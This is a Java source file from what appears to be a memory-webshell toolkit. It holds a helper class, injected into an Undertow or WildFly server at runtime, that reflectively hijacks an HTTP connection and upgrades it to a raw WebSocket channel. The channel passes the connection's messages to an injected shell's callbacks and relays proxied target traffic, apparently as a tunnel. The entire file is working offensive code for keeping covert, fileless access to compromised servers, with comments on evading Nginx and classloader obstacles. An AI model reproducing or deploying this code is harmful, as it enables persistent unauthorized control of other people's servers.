package com.reajason.javaweb.memshell.server.undertow;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * Undertow RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code <shellClassName>$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接：
 * 从 servlet request/response 反射取出 {@code HttpServerExchange}，用
 * {@code upgradeChannel} 让 Undertow 在 101 响应刷出后交出底层
 * {@code org.xnio.StreamConnection}，之后直接读写连接通道并反射调用 shell 的协议回调。
 * <p>
 * 101 与握手头由 Undertow 的响应管道写出，本类只补 {@code Sec-WebSocket-Accept}；
 * helper 自身只依赖 JDK，javax 与 jakarta 两种命名空间共用同一份代码。
 *
 * @author ReaJason
 */
public class UndertowRawWsHelper implements InvocationHandler, Runnable {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    private static final long READ_POLL_TIMEOUT = 5000L;
    private static final int IO_BUFFER_SIZE = 8192;

    private Object connection;
    private Object sourceChannel;
    private Object sinkChannel;
    private Method readMethod;
    private Method writeMethod;
    private Method flushMethod;
    private Method awaitReadableMethod;
    private Method awaitWritableMethod;
    private Method upgradeWithProductName;
    private Method upgradePlain;

    private final byte[] singleByte = new byte[1];
    /**
     * 已从连接读出但尚未消费的字节。帧头和掩码按单字节读取，一次 awaitReadable
     * 读满内部缓冲后再逐字节消费（XNIO 的 awaitReadable 每次都要注册一次 selector）。
     */
    private byte[] pending;
    private int pendingIndex;
    private int pendingLength;

    private final Object writeLock = new Object();
    private volatile boolean closed;
    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;
    private InputStream pumpInput;
    private Map attributes;
    private boolean hijacked;

    public UndertowRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（upgrade 已登记），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        Object key = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        Object exchange = findExchange(request, response);
        if (exchange == null || !isHttp11(exchange)) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }

        // 先登记 upgrade，成功后再写握手头：101 与握手头由 Undertow 的响应管道在
        // exchange 完成时统一写出（upgradeChannel 只登记 listener，channel 要等 101
        // 刷出后才经 handleUpgrade 交出），握手头因此只能落在 servlet response 上。
        // upgrade 失败时 response 保持干净，调用方可安全回落 FilterChain。
        Object listener = createUpgradeListener(exchange);
        if (listener == null || !installUpgrade(exchange, listener)) {
            return false;
        }
        // upgrade 已登记，连接确定被接管，之后任何步骤失败都不能再回落。
        this.hijacked = true;

        // Nginx 会剥离 Upgrade 并把 Connection 改成 close：升级响应头由 upgradeChannel
        // 直接写进 exchange，随后强制 persistent，避免 Undertow 按普通短连接直接 close。
        setHeader(response, "Sec-WebSocket-Accept", accept);
        setHeader(response, "Upgrade", "websocket");
        setHeader(response, "Connection", "Upgrade");
        setHeader(response, "X-Accel-Buffering", "no");

        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary", new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText", new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});
        invoke(exchange, "setPersistent", new Class[]{boolean.class}, new Object[]{Boolean.TRUE});
        return true;
    }

    // ---------------------------------------------------------------- 接管升级

    /**
     * HttpUpgradeListener 在运行时由 Undertow 自己的类加载器加载，helper 不能引用它；
     * 用 JDK Proxy 实现该接口，本类就是 InvocationHandler，handleUpgrade 回调再启动帧循环。
     */
    private Object createUpgradeListener(Object exchange) {
        try {
            Class listenerClass = null;
            Method withProductName = null;
            Method plain = null;
            Method[] methods = exchange.getClass().getMethods();
            for (int i = 0; i < methods.length; i++) {
                Method candidate = methods[i];
                if (!"upgradeChannel".equals(candidate.getName())) {
                    continue;
                }
                Class[] parameterTypes = candidate.getParameterTypes();
                if (parameterTypes.length == 2 && parameterTypes[0] == String.class) {
                    withProductName = candidate;
                    listenerClass = parameterTypes[1];
                } else if (parameterTypes.length == 1) {
                    plain = candidate;
                    if (listenerClass == null) {
                        listenerClass = parameterTypes[0];
                    }
                }
            }
            if (listenerClass == null) {
                return null;
            }
            this.upgradeWithProductName = withProductName;
            this.upgradePlain = plain;
            // WildFly 的 webapp ModuleClassLoader 默认看不到 io.undertow.server 包，
            // 用 helper 自己的 loader 建 Proxy 会报 "interface is not visible from class loader"。
            // 代理类改由 interface 的 loader 定义；InvocationHandler 仍用 helper 实例，跨 loader 调用即可。
            ClassLoader listenerLoader = listenerClass.getClassLoader();
            try {
                return Proxy.newProxyInstance(listenerLoader, new Class[]{listenerClass}, this);
            } catch (Throwable ignored) {
                return Proxy.newProxyInstance(getClass().getClassLoader(),
                        new Class[]{listenerClass}, this);
            }
        } catch (Throwable ignored) {
            return null;
        }
    }

    private boolean installUpgrade(Object exchange, Object listener) {
        try {
            if (upgradeWithProductName != null) {
                upgradeWithProductName.invoke(exchange, new Object[]{"websocket", listener});
                return true;
            }
            if (upgradePlain != null) {
                upgradePlain.invoke(exchange, new Object[]{listener});
                return true;
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) {
        String name = method.getName();
        if ("handleUpgrade".equals(name) && args != null && args.length == 2) {
            startSession(args[0]);
            return null;
        }
        if ("equals".equals(name) && args != null && args.length == 1) {
            return proxy == args[0] ? Boolean.TRUE : Boolean.FALSE;
        }
        if ("hashCode".equals(name)) {
            return Integer.valueOf(System.identityHashCode(proxy));
        }
        if ("toString".equals(name)) {
            return "UndertowRawWsHelper";
        }
        return null;
    }

    /**
     * Undertow 在 I/O 线程上回调 handleUpgrade，帧循环必须换到独立线程，
     * 否则会一直占住连接的事件线程。
     */
    private void startSession(Object streamConnection) {
        this.connection = streamConnection;
        this.sourceChannel = invoke(streamConnection, "getSourceChannel", new Class[0], null);
        this.sinkChannel = invoke(streamConnection, "getSinkChannel", new Class[0], null);
        if (sourceChannel == null || sinkChannel == null) {
            closeConnection();
            return;
        }
        this.readMethod = findMethod(sourceChannel, "read", new Class[]{ByteBuffer.class});
        this.writeMethod = findMethod(sinkChannel, "write", new Class[]{ByteBuffer.class});
        this.flushMethod = findMethod(sinkChannel, "flush", new Class[0]);
        this.awaitReadableMethod = findMethod(sourceChannel, "awaitReadable",
                new Class[]{long.class, TimeUnit.class});
        this.awaitWritableMethod = findMethod(sinkChannel, "awaitWritable",
                new Class[]{long.class, TimeUnit.class});
        if (readMethod == null || writeMethod == null) {
            closeConnection();
            return;
        }
        Thread thread = new Thread(this,
                "rawws-" + Integer.toHexString(System.identityHashCode(this)));
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        try {
            if (connection != null) {
                connection.getClass().getMethod("close", new Class[0]).invoke(connection, new Object[0]);
            }
        } catch (Throwable ignored) {
        }
        this.sourceChannel = null;
        this.sinkChannel = null;
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWire(byte[] buffer, int offset, int length) throws IOException {
        if (length <= 0) {
            return 0;
        }
        // 帧头和掩码按单字节读取；一次 awaitReadable 读满内部缓冲后再逐字节消费，
        // 否则每个字节都要走一遍 XNIO 的 selector await。payload 等大块读取直接落到调用方缓冲区。
        if (pendingIndex >= pendingLength && length == 1) {
            if (pending == null || pending.length < IO_BUFFER_SIZE) {
                pending = new byte[IO_BUFFER_SIZE];
            }
            int count = readWireDirect(pending, 0, pending.length);
            if (count <= 0) {
                return count;
            }
            pendingLength = count;
            pendingIndex = 0;
        }
        if (pendingIndex < pendingLength) {
            int count = pendingLength - pendingIndex;
            if (count > length) {
                count = length;
            }
            System.arraycopy(pending, pendingIndex, buffer, offset, count);
            pendingIndex += count;
            return count;
        }
        return readWireDirect(buffer, offset, length);
    }

    private int readWireDirect(byte[] buffer, int offset, int length) throws IOException {
        ByteBuffer byteBuffer = ByteBuffer.wrap(buffer, offset, length);
        while (!closed) {
            if (!awaitReadable()) {
                continue;
            }
            int count;
            try {
                Object value = readMethod.invoke(sourceChannel, new Object[]{byteBuffer});
                count = value instanceof Integer ? ((Integer) value).intValue() : 0;
            } catch (InvocationTargetException e) {
                throw asIOException(e.getCause());
            } catch (Throwable t) {
                throw asIOException(t);
            }
            if (count != 0) {
                return count;
            }
            // 没有 awaitReadable 的降级分支不会再阻塞，读到 0 必须主动让出 CPU
            if (awaitReadableMethod == null) {
                sleepQuietly();
            }
        }
        return -1;
    }

    private int readWireByte() throws IOException {
        while (!closed) {
            int count = readWire(singleByte, 0, 1);
            if (count > 0) {
                return singleByte[0] & 0xFF;
            }
            if (count < 0) {
                return -1;
            }
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length) {
            int count = readWire(buffer, offset + read, length - read);
            if (count < 0) {
                throw new IOException("unexpected EOF");
            }
            if (count == 0) {
                if (closed) {
                    throw new IOException("connection closed");
                }
                continue;
            }
            read += count;
        }
    }

    /**
     * 只负责把数据写进 XNIO 写缓冲，不 flush；完整帧（头+正文）由
     * {@link #sendFrame} 写完后统一 {@link #flushWire()}，避免每帧两次 flush。
     */
    private void writeWire(byte[] data, int offset, int length) throws IOException {
        ByteBuffer byteBuffer = ByteBuffer.wrap(data, offset, length);
        while (byteBuffer.hasRemaining()) {
            if (closed) {
                throw new IOException("connection closed");
            }
            if (awaitWritableMethod != null && !awaitWritable()) {
                continue;
            }
            int count;
            try {
                Object value = writeMethod.invoke(sinkChannel, new Object[]{byteBuffer});
                count = value instanceof Integer ? ((Integer) value).intValue() : 0;
            } catch (InvocationTargetException e) {
                throw asIOException(e.getCause());
            } catch (Throwable t) {
                throw asIOException(t);
            }
            if (count < 0) {
                throw new IOException("connection closed");
            }
            if (count == 0) {
                sleepQuietly();
            }
        }
    }

    private void flushWire() throws IOException {
        if (flushMethod == null) {
            return;
        }
        while (!closed) {
            boolean flushed;
            try {
                Object value = flushMethod.invoke(sinkChannel, new Object[0]);
                flushed = !(value instanceof Boolean) || ((Boolean) value).booleanValue();
            } catch (InvocationTargetException e) {
                throw asIOException(e.getCause());
            } catch (Throwable t) {
                throw asIOException(t);
            }
            if (flushed) {
                return;
            }
            // flush 返回 false 表示写缓冲仍然拥塞，XNIO 会在 channel 重新可写时回调；
            // 必须先 awaitWritable 再重试，否则这里会空转把 CPU 打满。
            if (awaitWritableMethod != null) {
                awaitWritable();
            } else {
                sleepQuietly();
            }
        }
    }

    private boolean awaitReadable() throws IOException {
        if (awaitReadableMethod == null) {
            return true;
        }
        try {
            Object value = awaitReadableMethod.invoke(sourceChannel,
                    new Object[]{Long.valueOf(READ_POLL_TIMEOUT), TimeUnit.MILLISECONDS});
            // XNIO 的 awaitReadable/awaitWritable 返回 void，正常返回即视为可能可读；
            // 个别实现返回 boolean 时才按返回值判断。
            if (awaitReadableMethod.getReturnType() == Void.TYPE) {
                return true;
            }
            return value instanceof Boolean && ((Boolean) value).booleanValue();
        } catch (InvocationTargetException e) {
            throw asIOException(e.getCause());
        } catch (Throwable t) {
            throw asIOException(t);
        }
    }

    private boolean awaitWritable() throws IOException {
        try {
            Object value = awaitWritableMethod.invoke(sinkChannel,
                    new Object[]{Long.valueOf(READ_POLL_TIMEOUT), TimeUnit.MILLISECONDS});
            if (awaitWritableMethod.getReturnType() == Void.TYPE) {
                return true;
            }
            return value instanceof Boolean && ((Boolean) value).booleanValue();
        } catch (InvocationTargetException e) {
            throw asIOException(e.getCause());
        } catch (Throwable t) {
            throw asIOException(t);
        }
    }

    private static IOException asIOException(Throwable throwable) {
        if (throwable instanceof IOException) {
            return (IOException) throwable;
        }
        return new IOException(String.valueOf(throwable));
    }

    private static void sleepQuietly() {
        try {
            Thread.sleep(1);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    // ---------------------------------------------------------------- 协议

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int e1 = readWireByte();
                    int e2 = readWireByte();
                    if (e1 < 0 || e2 < 0) {
                        return;
                    }
                    length = (e1 << 8) | e2;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int b = readWireByte();
                        if (b < 0) {
                            return;
                        }
                        length = (length << 8) | b;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    if (message.length == 1) {
                        // RFC 6455 §5.5：Close 正文要么为空，要么至少是 2 字节状态码
                        closeWith(1002, "invalid close frame payload");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    closeConnection();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    /**
     * 分块读取并按全局偏移解掩码，避免按帧头声明的长度一次性预分配大数组
     * （对端可以声明 50MB 却只发很少字节）。length 为 0 时返回空数组。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        int chunkSize = Math.min(total, IO_BUFFER_SIZE);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                writeWire(header, 0, header.length);
                writeWire(data, 0, data.length);
                flushWire();
            } catch (Throwable ignored) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        closeConnection();
    }

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
     * 为 Proxy 壳提供目标端到客户端的异步泵送。帧循环占用独立 daemon 线程，
     * 与 Tomcat helper 一致；本类的 Runnable 身份留给泵线程。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        // startPump 的线程只负责把目标端字节转成 WebSocket 帧；帧循环在接管连接的线程里跑
        if ("rawws-pump".equals(Thread.currentThread().getName())) {
            InputStream targetInput = pumpInput;
            if (targetInput == null) {
                return;
            }
            byte[] buffer = new byte[8192];
            try {
                while (!closed) {
                    int count = targetInput.read(buffer);
                    if (count == -1) {
                        break;
                    }
                    if (count > 0) {
                        byte[] data = new byte[count];
                        System.arraycopy(buffer, 0, data, 0, count);
                        sendBinary(data);
                    }
                }
            } catch (Throwable ignored) {
            }
            closeWith(1000, null);
            return;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        try {
            frameLoop();
        } catch (Throwable ignored) {
        } finally {
            invokeQuietly(onDisconnect, shell, new Object[]{this});
            closeConnection();
        }
    }

    // ---------------------------------------------------------------- 反射工具

    /**
     * 从 Filter 拿到的 ServletRequest/ServletResponse 找到 Undertow 的 exchange。
     * 其它 Filter 可能包装过 request，沿 getRequest/getResponse 链查找，最多 8 层。
     */
    private static Object findExchange(Object request, Object response) {
        Object exchange = findExchangeOn(response);
        if (exchange == null) {
            exchange = findExchangeOn(request);
        }
        return exchange;
    }

    private static Object findExchangeOn(Object target) {
        Object current = target;
        for (int depth = 0; current != null && depth < 8; depth++) {
            Object exchange = invoke(current, "getExchange", new Class[0], null);
            if (exchange == null) {
                exchange = getField(current, "exchange");
            }
            if (exchange != null) {
                return exchange;
            }
            Object next = invoke(current, "getRequest", new Class[0], null);
            if (next == null) {
                next = invoke(current, "getResponse", new Class[0], null);
            }
            if (next == null || next == current) {
                return null;
            }
            current = next;
        }
        return null;
    }

    private static boolean isHttp11(Object exchange) {
        Object value = invoke(exchange, "isHttp11", new Class[0], null);
        return value instanceof Boolean && ((Boolean) value).booleanValue();
    }

    private static void setHeader(Object response, String name, String value) {
        if (response == null) {
            return;
        }
        try {
            response.getClass().getMethod("setHeader", new Class[]{String.class, String.class})
                    .invoke(response, new Object[]{name, value});
        } catch (Throwable ignored) {
        }
    }

    private static Object getField(Object target, String name) {
        if (target == null) {
            return null;
        }
        Class<?> clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (InvocationTargetException e) {
            return null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String base64Encode(byte[] data) {
        try {
            Class<?> base64Class = Class.forName("java.util.Base64");
            Object encoder = base64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, new Object[]{data});
        } catch (Throwable ignored) {
        }
        try {
            Class<?> encoderClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = encoderClass.newInstance();
            String value = (String) encoderClass.getMethod("encode", byte[].class)
                    .invoke(encoder, new Object[]{data});
            return value.replace("\n", "").replace("\r", "");
        } catch (Throwable ignored) {
            return null;
        }
    }
}
